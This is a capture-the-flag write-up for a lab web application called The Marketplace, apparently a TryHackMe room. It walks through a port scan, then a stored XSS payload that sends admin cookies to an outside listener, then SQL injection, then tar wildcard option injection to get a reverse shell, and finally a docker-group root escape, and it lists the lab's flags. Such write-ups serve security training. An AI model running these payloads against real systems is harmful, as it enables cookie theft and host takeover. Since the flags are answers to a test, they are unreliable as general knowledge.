# The Marketplace — Writeup

## Overview

Assessment of the web application **The Marketplace**. During testing we discovered multiple vulnerabilities, escalated privileges and retrieved three flags.

---

## Port scan

Run `nmap` to discover open ports and service versions:

```bash
sudo nmap -Pn -sV -A -T4 -vv 10.10.192.198 -p-
```

Sample output (trimmed):

```
PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open   http    syn-ack ttl 62 nginx 1.19.2
32768/tcp open   http    syn-ack ttl 62 Node.js (Express middleware)
```

`robots.txt` on HTTP servers disallows `/admin`.

---

## Accounts and navigation

* Register a new user (example `user/123`).
* Login available. The test session was already logged in as a user.

Relevant endpoints:

* Items: `http://10.10.192.20/item/1`, `http://10.10.192.20/item/2`
* Contact listing author: `http://10.10.192.20/contact/michael`
* Report listing: `http://10.10.192.20/report/1`

---

## Stored XSS in listing description

Created a listing with XSS in the description:

```html
<script>alert(1)</script>
```

XSS executes. To exfiltrate admin cookies used payload:

```html
<script>document.location='http://10.21.24.3/info?c='+document.cookie</script>
```

Reproduction steps:

1. Start a listener for incoming requests:

```bash
nc -nvlk 80
```

2. Create a new listing and add the XSS payload to the description.
3. Report the listing to admin, e.g. `http://10.10.192.20/report/5`.
4. Observe incoming request with admin cookie on the listener.

Example captured request:

```json
GET /info?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NTk3NzY1NTZ9.Vbu7ybpz4vtffd7xEmcwxUnlAuaurMe6ZbuiFis0K1I HTTP/1.1 Host: 10.21.24.3 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://localhost:3000/item/5 Accept-Encoding: gzip, deflate Accept-Language: en-US
```

Decoded JWT payload (example):

```json
{
  "userId": 2,
  "username": "michael",
  "admin": true,
  "iat": 1759776556
}
```

With this token we gained admin access and visited `/admin`.

**Flag 1**: `THM{c37a63895910e478f28669b048c348d5}`

Admin page used: `http://10.10.192.20/admin?user=1`

---

## SQL injection in `user` parameter

Request `http://10.10.192.20/admin?user=1'` returned a SQL parse error:

```
Error: ER_PARSE_ERROR: ... near ''' at line 1
```

Using a crafted `UNION SELECT` revealed messages from the database:

```
http://10.10.192.20/admin?user=2 and 1=2 union select group_concat(user_to, message_content), null, null, null from messages
```

One message contained a generated temporary SSH password:

```
Your new password is: @b_ENXkGYUCAv3zJ
```

User with `id = 3` is `jack` (referred to as `jake`/`jack` in notes).

---

## SSH to user `jack`

* Logged in via SSH using password `@b_ENXkGYUCAv3zJ`.
* Shell user: `jake` (uid=1000).

**Flag 2** (`user.txt`):

```
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

`sudo -l` output for `jake`:

```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

Contents of `/opt/backups/backup.sh`:

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

---

## Privilege escalation via `tar`

The backup script uses `tar` with a wildcard `*`. This allows execution via `--checkpoint-action` when `tar` processes crafted filenames.

Exploit approach (summary):

1. Create a shell script on disk that opens a reverse shell to attacker listener.
2. Create files whose names are `--checkpoint-action=exec=sh shell.sh` and `--checkpoint=1` so `tar` interprets them as options.
3. Run the backup script via `sudo` as `michael`:

```bash
sudo -u michael /opt/backups/backup.sh
```

This yields a shell as `michael`.

---

## Docker misconfiguration and host takeover

`michael` is in the `docker` group. Containers running on the host:

```
docker ps
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 49ecb0cfeba8 nginx "/docker-entrypoint.…" 5 years ago Up 35 minutes 0.0.0.0:80->80/tcp themarketplace_nginx_1 3c6f21da8043 themarketplace_marketplace "bash ./start.sh" 5 years ago Up 35 minutes 0.0.0.0:32768->3000/tcp themarketplace_marketplace_1 59c54f4d0f0c mysql "docker-entrypoint.s…" 5 years ago Up 35 minutes 3306/tcp, 33060/tcp themarketplace_db_1
```

Steps to escalate from `docker` group to host root (summary):

1. Obtain an interactive shell inside a container and get a TTY:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

2. Use Docker to mount host filesystem and chroot into it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Inside chroot the user is root.

**Flag 3 (root)**:

```
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

---

## Summary of findings

Vulnerabilities exploited:

* Stored XSS in listing description used to steal admin JWT.
* SQL injection in admin `user` parameter to read internal messages.
* Insecure backup script using `tar` with uncontrolled filenames leading to command execution as `michael`.
* Docker group membership allowed host filesystem access and root takeover.

All three flags were retrieved and are listed above.
